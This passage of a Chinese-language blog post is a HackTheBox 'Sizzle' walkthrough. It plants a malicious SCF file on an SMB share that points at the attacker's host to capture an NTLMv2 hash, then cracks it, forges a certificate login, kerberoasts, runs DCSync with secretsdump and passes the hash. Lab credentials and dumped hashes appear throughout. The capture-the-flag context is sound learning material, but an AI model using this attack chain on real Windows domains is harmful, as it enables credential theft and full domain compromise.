+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">ADMIN$          Disk      Remote Admin</span><br><span class="line">C$              Disk      Default share</span><br><span class="line">CertEnroll      Disk      Active Directory Certificate Services share</span><br><span class="line">Department Shares Disk      </span><br><span class="line">IPC$            IPC       Remote IPC</span><br><span class="line">NETLOGON        Disk      Logon server share </span><br><span class="line">Operations      Disk      </span><br><span class="line">SYSVOL          Disk      Logon server share</span><br></pre></td></tr></table></figure>
+<p>經檢查，只有 <code>Department Shares</code> 可以造訪並列表 …<br>利用 mount 抓到自己主機內尋找  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t cifs -o rw,username=guest,password= <span class="string">&#x27;//10.10.10.103/Department Shares&#x27;</span> /mnt</span><br></pre></td></tr></table></figure>
+<p>接下來用如下腳本尋找可寫的資料夾：<br><strong>find-w.sh</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">list=$(find /mnt -<span class="built_in">type</span> d)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> <span class="variable">$list</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        <span class="built_in">touch</span> <span class="variable">$d</span>/x 2&gt;/dev/null</span><br><span class="line">        <span class="keyword">if</span> [ $? -eq 0 ]</span><br><span class="line">        <span class="keyword">then</span></span><br><span class="line">                <span class="built_in">echo</span> <span class="variable">$d</span> <span class="string">&quot; is writable&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/mnt/Users/Public  is writable</span><br><span class="line">/mnt/ZZ_ARCHIVE  is writable</span><br></pre></td></tr></table></figure>
+<p>接著將惡意的 scf file 放進主機，具體內容可看：<br><a target="_blank" rel="noopener" href="https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/">https://1337red.wordpress.com/using-a-scf-file-to-gather-hashes/</a><br><a target="_blank" rel="noopener" href="https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/">https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/</a>  </p>
+<p><strong>@exp.scf</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\10.10.14.14\share\whale.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure>
+<p>最後放進主機：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali🐳kali)-[~/ctf/hackthebox/sizzle]</span><br><span class="line">└─$ smbclient <span class="string">&#x27;//10.10.10.103/Department Shares&#x27;</span> -N</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> Users/Public</span><br><span class="line">smb: \Users\Public\&gt; put @exp.scf</span><br></pre></td></tr></table></figure>
+<p>接下來用 responder 收聽 tun0 所有資訊：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure>
+<p><strong>Result</strong>  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : 10.10.10.103</span><br><span class="line">[SMB] NTLMv2-SSP Username : HTB\amanda</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : amanda::HTB:e78d6bf8ec9ce164:B1FCA5EB7768E4AB418924D45EFCA0D2:0101000000000000002D1369A259DB019F1200851F8CAD6B0000000002000800310056004F00530001001E00570049004E002D004B0044003100490052003600340049004F003400390004003400570049004E002D004B0044003100490052003600340049004F00340039002E00310056004F0053002E004C004F00430041004C0003001400310056004F0053002E004C004F00430041004C0005001400310056004F0053002E004C004F00430041004C0007000800002D1369A259DB010600040002000000080030003000000000000000010000000020000006747BA36BA6A6F5FE6BACF5700EF4255B095EB6FE744AE2896C0C06D25CE41C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003400000000000000000000000000 </span><br></pre></td></tr></table></figure>
+<p>收聽成功，利用 john 進行 hash 字典攻擊  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=/home/kali/rockyou.txt</span><br></pre></td></tr></table></figure>
+<p>利用獲得的帳密登入 <code>http://10.10.10.103</code><br><img src="https://hackmd.io/_uploads/rkc4Q5RBJx.png" alt="image">  </p>
+<p><img src="https://hackmd.io/_uploads/ByRMrc0Hkl.png" alt="image"><br>但是 evil-winrm 會登入失敗…憑證錯誤，所以要先去拿一張新的  </p>
+<h3 id="Apply-new-cert"><a href="#Apply-new-cert" class="headerlink" title="Apply new cert"></a>Apply new cert</h3><p>用 openssl 生成新的 private key 和 cert：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -newkey rsa:2048 -nodes -keyout amanda.key -out amanda.csr</span><br></pre></td></tr></table></figure>
+
+<p>接著到 Request a certificate -&gt; advanced certificate request 新增一個憑證請求，把 amanda.csr 傳上去<br><img src="https://hackmd.io/_uploads/rkrD45RrJl.png" alt="image">  </p>
+<p>最後把憑證以 base64 下載下來<br><img src="https://hackmd.io/_uploads/rJCwEcArJx.png" alt="image">  </p>
+<p>以 evil-winrm 進行連線：<br><strong>Command</strong>  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.103 -u amanda -S -c certnew.cer -k amanda.key</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/H1QoRsAryg.png" alt="image"><br>P.S. <code>-u</code> 的選項疑似不用指定…  </p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>一樣先用 bloodhound 進行資訊採集：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -c All -u <span class="string">&#x27;amanda&#x27;</span> -p <span class="string">&#x27;Ashare1972&#x27;</span> -d HTB.LOCAL -ns 10.10.10.103 --zip</span><br></pre></td></tr></table></figure>
+<p>注意到 MRLKY kerberoastable：  </p>
+<p><img src="https://hackmd.io/_uploads/S1CYmJk8Jg.png" alt="image">  </p>
+<h3 id="kerberoasting-with-Rebeus"><a href="#kerberoasting-with-Rebeus" class="headerlink" title="kerberoasting with Rebeus"></a>kerberoasting with Rebeus</h3><p>因為 kerberos 沒有對外開放，在主機內以 Rebeus 進行攻擊：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.io/_uploads/ryUhNyyUJg.png" alt="image">  </p>
+<p>將獲得的 TGS 以john爆破，取得密碼後再按照上面的流程申請一遍憑證就可以以 evil-winrm 再次登入了  </p>
+<h3 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h3><p>了無新意的 DCSync…<br>利用 impacket-secretsdump 進行攻擊：  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump <span class="string">&#x27;htb.local&#x27;</span>/<span class="string">&#x27;mrlky&#x27;</span>:<span class="string">&#x27;Football#7&#x27;</span>@<span class="string">&#x27;htb.local&#x27;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied </span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::</span><br><span class="line">... a lot of stuffs</span><br></pre></td></tr></table></figure>
+<p>最後用 smbexec 進行 pass the hash<br><img src="https://hackmd.io/_uploads/rkynLk1Ukx.png" alt="image">  </p>
+<p><strong>OWNED</strong>  </p>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>這台機器嚴格來說只有第一步 scf 和 cert 的部分真的卡到，沒想像中難(?)<br>但還是學到好多，開心開心  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RECON"><span class="toc-number">2.</span> <span class="toc-text">RECON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#port-scan"><span class="toc-number">2.1.</span> <span class="toc-text">port scan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#directory-enumeration"><span class="toc-number">2.2.</span> <span class="toc-text">directory enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">3.</span> <span class="toc-text">Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#scf-file-attack"><span class="toc-number">3.1.</span> <span class="toc-text">scf file attack</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apply-new-cert"><span class="toc-number">3.2.</span> <span class="toc-text">Apply new cert</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation"><span class="toc-number">4.</span> <span class="toc-text">Privilege Escalation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#kerberoasting-with-Rebeus"><span class="toc-number">4.1.</span> <span class="toc-text">kerberoasting with Rebeus</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DCSync"><span class="toc-number">4.2.</span> <span class="toc-text">DCSync</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">5.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2024/12/29/htb-sizzle/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2024/12/29/htb-sizzle/&text=Sizzle on HackTheBox"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2024/12/29/htb-sizzle/&title=Sizzle on HackTheBox"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2024/12/29/htb-sizzle/&is_video=false&description=Sizzle on HackTheBox"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Sizzle on HackTheBox&body=Check out this article: http://wha13.github.io/2024/12/29/htb-sizzle/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2024/12/29/htb-sizzle/&title=Sizzle on HackTheBox"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2024/12/29/htb-sizzle/&title=Sizzle on HackTheBox"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2024/12/29/htb-sizzle/&title=Sizzle on HackTheBox"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2024/12/29/htb-sizzle/&title=Sizzle on HackTheBox"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2024/12/29/htb-sizzle/&name=Sizzle on HackTheBox&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2024/12/29/htb-sizzle/&t=Sizzle on HackTheBox"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2024
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
